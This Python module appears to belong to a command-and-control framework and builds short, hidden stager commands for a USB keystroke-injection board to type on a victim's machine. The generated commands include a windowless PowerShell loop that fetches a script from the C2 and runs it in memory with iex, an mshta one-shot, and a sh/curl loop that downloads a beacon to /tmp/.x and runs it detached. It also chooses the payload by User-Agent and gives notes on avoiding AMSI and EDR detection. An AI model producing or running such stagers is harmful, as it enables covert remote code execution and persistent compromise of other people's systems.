"""short_stager.py — compact, resilient, hidden stagers for HID delivery.

``builder.generate_dropper`` emits the FULL resilient PIC stager: on Windows
that is ~11.4k characters. It is fine pasted by an operator into a shell, but
a USB HID board has to TYPE every character — 11k chars are minutes on
screen, fully visible, and HID boards drop keystrokes on long strings. For the
HID path we need the opposite:

  * SHORT     — small enough to type in seconds;
  * HIDDEN    — no console window on Windows;
  * RESILIENT — if the C2 is down the command is not lost: it retries on a
                timer and connects when the C2 comes back;
  * IN-MEMORY — the Windows payload is run from memory, never written to disk.

The trick that keeps all four at once: the TYPED command is only a short
fetcher, and the heavy stager script is served by the C2. The board types the
SAME short fetch on every OS, and the delivery endpoint decides what to serve
from the ``User-Agent`` — ``detect_platform`` is that decision, i.e. the piece
that lets ONE payload serve Windows, Linux and macOS without the board being
able to detect the OS itself (a keyboard cannot read the host back).

Resilience lives CLIENT-side as a retry loop, so it survives a cold C2:
the command keeps polling until the download succeeds, then breaks.
"""

from __future__ import annotations

from typing import Optional, Tuple

# Windows loaders, ordered by a real trade-off (see `loader_notes`):
#   * "powershell" — hidden + a retry LOOP (resilient), no disk, but AMSI-visible
#                    text if the fetched script uses IEX/Add-Type;
#   * "mshta"      — the SHORTEST, runs an HTA with no console, but a single
#                    shot: it cannot loop, so it is NOT resilient by itself.
LOADERS = ("powershell", "mshta")

# default retry cadence (seconds) for the client-side loop
DEFAULT_RETRY_S = 30

# The board TYPES the command on screen, one keystroke at a time. The full
# resilient PIC stager is ~11.4k chars (measured: an operator timed minutes of
# typing on a Leonardo): a long visible window, and boards drop keystrokes on
# long runs. This is the ceiling the download-mode command is held to, and
# `hid_download_command` refuses to hand back anything longer — "it is short"
# is the entire reason the download mode exists.
MAX_TYPED_CHARS = 600

# Where a SHORT stager fetches from. Two different KINDS of endpoint, one
# pairing to get right: Windows iex's a SCRIPT (the raw shellcode `/x` carries
# is not text), while the POSIX families fetch the compiled beacon directly.
# The pairing lives here, next to `build_short_stager`, so no call site can
# pick the wrong one.
_DOWNLOAD_ROUTES = {
    "windows": "/s/windows",
    "linux": "/api/v1/payload_linux",
    "macos": "/api/v1/payload_macos",
    "android": "/api/v1/payload_android",
}

_PLATFORMS = ("windows", "macos", "linux", "android")


def detect_platform(user_agent: Optional[str]) -> str:
    """The target OS a User-Agent most likely is (for server-side delivery).

    Conservative and substring-based on the tokens actually found in real
    browser/curl/wget UAs; anything unrecognised is ``"unknown"`` so a caller
    never serves a Windows payload to an unknown client by default.
    """
    ua = (user_agent or "").lower()
    if not ua:
        return "unknown"
    if "android" in ua:
        return "android"
    if "iphone" in ua or "ipad" in ua or "macintosh" in ua or "mac os" in ua:
        return "macos"
    if "windows" in ua or "win32" in ua or "win64" in ua or "wow64" in ua:
        return "windows"
    if "linux" in ua or "x11" in ua or "ubuntu" in ua or "debian" in ua:
        return "linux"
    return "unknown"


def payload_route(platform: str, *, pic: bool = False) -> str:
    """The C2 route that serves the beacon for ``platform``.

    ``pic=True`` returns the Windows in-memory XOR-wrapped PIC endpoint
    (``/x``); otherwise the platform's compiled-beacon route.
    """
    platform = (platform or "").lower()
    if platform == "windows":
        return "/x" if pic else "/api/v1/payload"
    if platform == "linux":
        return "/api/v1/payload_linux"
    if platform == "macos":
        return "/api/v1/payload_macos"
    if platform == "android":
        return "/api/v1/payload_android"
    return ""


def delivery_for(user_agent: Optional[str], base_url: str,
                 token: str = "") -> Tuple[str, str]:
    """(platform, url) the C2 should serve for this request.

    ``base_url`` is the C2 root (e.g. ``https://10.0.0.5:8443``); the token,
    when given, is appended as ``?auth=`` to match the existing stager URLs.
    Returns ``("unknown", "")`` when no platform can be determined, so the
    caller can 404 instead of guessing.
    """
    platform = detect_platform(user_agent)
    route = payload_route(platform)
    if not route:
        return platform, ""
    url = base_url.rstrip("/") + route
    if token:
        url += f"?auth={token}"
    return platform, url


def _win_retry_loop(inner: str, retry_s: int) -> str:
    """A one-liner retry loop around ``inner`` (runs once it finally succeeds)."""
    return (f"while(1){{try{{{inner};break}}catch{{sleep {max(1, int(retry_s))}}}}}"
            )


def build_short_stager(platform: str, url: str, *,
                       host: str = "", port: int = 0, ssl: bool = True,
                       retry_s: int = DEFAULT_RETRY_S,
                       loader: str = "powershell") -> str:
    """Build the SHORT typed command for one OS.

    Windows: a hidden PowerShell fetch with a client-side retry loop; the
    fetched script carries the heavy stager, so the typed text stays short.
    GNU/Linux and macOS: a ``sh`` loop that keeps curling until the beacon
    lands, then starts it detached with output dropped.

    Raises ``ValueError`` on an unknown platform/loader or an empty URL: a
    stager that cannot fetch is not a stager.
    """
    platform = (platform or "").lower()
    url = (url or "").strip()
    if not url:
        raise ValueError("short stager needs a delivery URL")
    if platform not in _PLATFORMS:
        raise ValueError(f"unknown platform {platform!r}: choose from "
                         f"{', '.join(_PLATFORMS)}")

    # The URL travels inside a quoted wrapper on every platform (`iwr '…'` on
    # Windows, `"…"` inside the single-quoted `sh -c` on POSIX). A quote in it
    # would END that wrapper early and hand the target a truncated command —
    # worse than a long one, because it looks right on screen and then fails
    # with nothing to read — and `$`/backtick would be EXPANDED by the shell
    # instead of fetched literally. Refusing here is cheap; finding it on a
    # board mid-engagement is not.
    for bad in ("'", '"', "$", "`"):
        if bad in url:
            raise ValueError(
                f"stager URL contains {bad!r}, which the typed command "
                f"cannot quote safely")

    if platform == "windows":
        loader = (loader or "powershell").lower()
        if loader not in LOADERS:
            raise ValueError(f"unknown loader {loader!r}: choose from "
                             f"{', '.join(LOADERS)}")
        if loader == "mshta":
            # shortest, windowless, but a single shot (cannot loop)
            return f'mshta "{url}"'
        fetch = ("iex(iwr '" + url + "' -UseB).Content")
        loop = _win_retry_loop(fetch, retry_s)
        return 'powershell -w h -c "' + loop + '"'

    # POSIX: sh -c '<loop>; <run detached>'
    #
    # The URL is DOUBLE-quoted even though the wrapper is SINGLE-quoted, and
    # that is deliberate rather than a quoting accident. Nesting the same
    # quote character is not a syntax error — adjacent quoted and unquoted
    # parts CONCATENATE, so `sh -c 'a 'b' c'` still hands sh one script — but
    # the URL comes out of it UNQUOTED, i.e. subject to word splitting and
    # pathname globbing inside the script, and the `?` of `?auth=<token>` is a
    # glob character. Distinct quoting keeps the URL one literal word; the
    # characters a double-quoted URL would let the shell EXPAND (`$`, backtick,
    # quotes) are refused above, so this is strictly the narrower form.
    #
    # -f turns an HTTP error (403/404) into a curl FAILURE, so the loop keeps
    # retrying instead of chmod-ing an error page and calling it delivered.
    # -k skips cert verification (self-signed C2) and is only meaningful over
    # TLS, so it is added solely for the https case.
    flags = "sf" + ("k" if ssl else "")
    out = "/tmp/.x"
    run = (f"{out} {host} {int(port)} {1 if ssl else 0}"
           if host else f"{out}")
    inner = (f'while ! curl -{flags} "{url}" -o {out};do sleep '
             f"{max(1, int(retry_s))};done;chmod +x {out};"
             f"nohup {run} >/dev/null 2>&1 &")
    return "sh -c '" + inner + "'"


def build_universal_fetch(url: str) -> str:
    """The ONE typed string that is identical on every OS: the URL itself.

    Meant for the browser-delivery path: the operator's opener (Win+R on
    Windows, Alt+F2 on GNOME/XFCE, Cmd+Space on macOS) puts a run/search box
    on screen, the board types only ``url``, and the server - by
    ``detect_platform`` - decides what to return. This is the closest thing
    to "one payload for all OSes" a keyboard board can offer.
    """
    url = (url or "").strip()
    if not url:
        raise ValueError("universal fetch needs a URL")
    return url


def download_route(platform: str) -> str:
    """The C2 route the TYPED short command fetches for ``platform``.

    ``""`` for a platform we have no artefact for, so a caller can refuse
    instead of guessing an endpoint.
    """
    return _DOWNLOAD_ROUTES.get((platform or "").lower(), "")


def short_stager_url(platform: str, base_url: str, token: str = "") -> str:
    """The URL `build_short_stager` needs for ``platform``.

    Windows gets the SCRIPT route, the POSIX families the binary one. Handing
    the Windows (``iex``) form a route that serves a PE would have PowerShell
    evaluate a binary as source — which is the mistake this function exists
    to make impossible. Raises ``ValueError`` on a platform with no route or
    an empty base URL.
    """
    route = download_route(platform)
    if not route:
        raise ValueError(f"no download route for platform {platform!r}")
    base = (base_url or "").strip().rstrip("/")
    if not base:
        raise ValueError("short stager needs a base URL")
    url = base + route
    if token:
        url += f"?auth={token}"
    return url


def hid_download_command(platform: str, host: str, port: int, *,
                         token: str = "", ssl: bool = True,
                         retry_s: int = DEFAULT_RETRY_S) -> str:
    """The command a HID board types in ``--stager-mode download``.

    ONE function decides the endpoint, the fetch and the length cap, so the
    HID path cannot drift from the C2 route that serves the artefact. Raises
    ``ValueError`` when the result would not fit the HID budget: an operator
    already holding a board needs a refusal, not a three-minute typing
    session they cannot see the end of.

    Download is the HID DEFAULT — the board types a fetcher and the beacon is
    downloaded — which is the opposite of what the paste-a-one-liner channels
    want (nothing is typed there, so an inline dropper costs them nothing).
    """
    platform = (platform or "").lower()
    if platform not in _PLATFORMS:
        raise ValueError(f"unknown platform {platform!r}: choose from "
                         f"{', '.join(_PLATFORMS)}")
    scheme = "https" if ssl else "http"
    url = short_stager_url(platform, f"{scheme}://{host}:{int(port)}", token)
    command = build_short_stager(platform, url, host=host, port=int(port),
                                 ssl=ssl, retry_s=retry_s)
    if len(command) > MAX_TYPED_CHARS:
        raise ValueError(
            f"the {platform} download stager is {len(command)} chars, over "
            f"the {MAX_TYPED_CHARS}-char HID budget (an over-long host "
            f"{host!r} is the usual cause) — shorten the address, or use "
            f"--stager-mode inline")
    return command


def loader_notes(platform: str, loader: str = "powershell") -> Tuple[str, ...]:
    """The honest trade-off of each Windows loader, for the operator."""
    if (platform or "").lower() != "windows":
        return ()
    if (loader or "").lower() == "mshta":
        return ("shortest and windowless, but a SINGLE shot: mshta cannot "
                "loop, so a cold C2 means a lost payload",
                "mshta is monitored by several EDRs - prefer it only when "
                "you can confirm the C2 is UP at delivery time")
    return ("hidden PowerShell with a CLIENT-side retry loop: survives a cold "
            "C2 and writes nothing to disk",
            "the fetched script must avoid Add-Type/IEX-per-line literals: "
            "AMSI sees the script text (the short command itself is clean)")
